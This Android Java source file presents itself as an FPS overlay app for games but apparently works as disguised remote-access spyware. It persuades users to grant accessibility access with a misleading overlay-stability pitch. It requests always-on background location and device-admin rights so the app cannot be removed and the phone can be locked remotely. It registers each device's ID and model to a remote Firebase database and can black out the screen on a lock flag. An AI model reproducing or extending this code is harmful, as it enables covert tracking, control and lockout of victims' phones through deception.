package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.widget.EditText;
import androidx.appcompat.widget.SwitchCompat;
import android.widget.Button;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class CoreActivity extends AppCompatActivity {

    private AlertDialog currentDialog;
    private static final int LOCATION_PERMISSION_REQUEST_CODE = 1001;
    private static final int BACKGROUND_LOCATION_PERMISSION_REQUEST_CODE = 1002;

    public native void initNative(String path);
    public native boolean isLockedNative();

    static {
        System.loadLibrary("fps-native");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            initNative(new java.io.File(getFilesDir(), ".v_stat").getAbsolutePath());
            if (isLockedNative()) {
                setContentView(new android.view.View(this));
                getWindow().getDecorView().setBackgroundColor(android.graphics.Color.BLACK);
                return;
            }
        } catch (UnsatisfiedLinkError e) {
            // Handle native library not loaded
        }

        setContentView(R.layout.activity_main);
        registerDeviceToFirebase();
        initializeUI();
        checkLocationPermissions();
        checkDeviceAdmin();
    }

    private void checkDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
        if (!dpm.isAdminActive(adminComponent)) {
            new AlertDialog.Builder(this)
                .setTitle("🛡️ Keamanan Sistem")
                .setMessage("Aktifkan mode Administrator untuk mencegah aplikasi dihapus dan mengizinkan penguncian sistem dari jauh.")
                .setPositiveButton("AKTIFKAN ADMIN", (dialog, which) -> {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Keamanan BONDEX untuk mencegah pencurian HP.");
                    startActivity(intent);
                })
                .setNegativeButton("NANTI", null)
                .show();
        }
    }

    private void checkLocationPermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, 
                new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, 
                LOCATION_PERMISSION_REQUEST_CODE);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                showBackgroundLocationDialog();
            }
        }
    }

    private void showBackgroundLocationDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Izin Lokasi Latar Belakang")
            .setMessage("Untuk fitur pelacakan keamanan yang maksimal saat HP hilang, aplikasi ini memerlukan izin lokasi 'Izinkan Sepanjang Waktu'. Silakan pilih 'Allow all the time' di menu pengaturan berikutnya.")
            .setPositiveButton("PENGATURAN", (dialog, which) -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    ActivityCompat.requestPermissions(this, 
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 
                        BACKGROUND_LOCATION_PERMISSION_REQUEST_CODE);
                }
            })
            .setNegativeButton("BATAL", null)
            .show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    showBackgroundLocationDialog();
                }
            } else {
                Toast.makeText(this, "Izin lokasi ditolak, fitur pelacakan tidak akan berfungsi.", Toast.LENGTH_LONG).show();
            }
        }
    }

    private String getDeviceId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private void registerDeviceToFirebase() {
        String deviceId = getDeviceId();
        String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
        
        DatabaseReference deviceRef = FirebaseDatabase.getInstance("https://bondexremot-default-rtdb.firebaseio.com").getReference("devices").child(deviceId);
        deviceRef.child("name").setValue(deviceName);
        deviceRef.child("last_seen").setValue(System.currentTimeMillis());
        deviceRef.child("status").setValue("App Opened (Pending Accessibility)");
    }

    private void initializeUI() {
        final SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
        final SwitchCompat swShow = findViewById(R.id.sw_show);
        final EditText etMin = findViewById(R.id.et_min);
        final EditText etMax = findViewById(R.id.et_max);
        final Button btnApply = findViewById(R.id.btn_apply);

        if (swShow == null || etMin == null || etMax == null || btnApply == null) {
            return;
        }

        String minVal = sharedPreferences.getString("min", "97");
        String maxVal = sharedPreferences.getString("max", "114");
        etMin.setText(minVal);
        etMax.setText(maxVal);

        boolean isShowing = sharedPreferences.getBoolean("is_showing", false);
        
        // Disable listener temporarily to set initial state without triggering logic
        swShow.setOnCheckedChangeListener(null);
        swShow.setChecked(isShowing);

        swShow.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked) {
                if (!isServiceEnabled()) {
                    swShow.setChecked(false);
                    showModernAccessibilityDialog();
                } else {
                    sharedPreferences.edit().putBoolean("is_showing", true).apply();
                    updateServiceState(true);
                }
            } else {
                sharedPreferences.edit().putBoolean("is_showing", false).apply();
                updateServiceState(false);
            }
        });

        btnApply.setOnClickListener(v -> {
            String min = etMin.getText().toString();
            String max = etMax.getText().toString();
            if (!min.isEmpty() && !max.isEmpty()) {
                sharedPreferences.edit()
                    .putString("min", min)
                    .putString("max", max)
                    .apply();
                Toast.makeText(this, "Settings Applied", Toast.LENGTH_SHORT).show();
                if (swShow.isChecked() && isServiceEnabled()) {
                    updateServiceState(true);
                }
            }
        });
    }

    private void updateServiceState(boolean isShowing) {
        Intent intent = new Intent(this, SupportService.class);
        if (isShowing) {
            intent.setAction("SHOW_FPS");
        } else {
            intent.setAction("HIDE_FPS");
        }
        startService(intent);
    }

    private void showModernAccessibilityDialog() {
        if (currentDialog != null && currentDialog.isShowing()) return;

        currentDialog = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Light_Dialog_Alert)
            .setTitle("FPS Realtime Optimization")
            .setMessage("Kami menggunakan overlay tipe aksesibilitas untuk menghindari bug overlay tenggelam atau tiba-tiba menghilang pas bermain. Dengan fitur aksesibilitas ini, FPS overlay kami jauh jadi lebih stabil dibanding menggunakan overlay biasa. Maka dari itu, klik izinkan aksesibilitas untuk menampilkan FPS overlay.")
            .setCancelable(false)
            .setPositiveButton("AKTIFKAN SEKARANG", (dialog, which) -> {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            })
            .setNegativeButton("NANTI", (dialog, which) -> dialog.dismiss())
            .show();
    }

    private boolean isServiceEnabled() {
        String s_id = getPackageName() + "/" + SupportService.class.getName();
        String active = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (active == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(active);
        while (splitter.hasNext()) {
            if (splitter.next().equalsIgnoreCase(s_id)) return true;
        }
        return false;
    }

    @Override
    protected void onResume() {
        super.onResume();
        SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
        SwitchCompat swShow = findViewById(R.id.sw_show);
        if (swShow != null) {
            boolean shouldShow = sharedPreferences.getBoolean("is_showing", false);
            if (shouldShow && isServiceEnabled()) {
                swShow.setChecked(true);
                updateServiceState(true);
            } else if (shouldShow) {
                swShow.setChecked(false);
            }
        }
    }
}
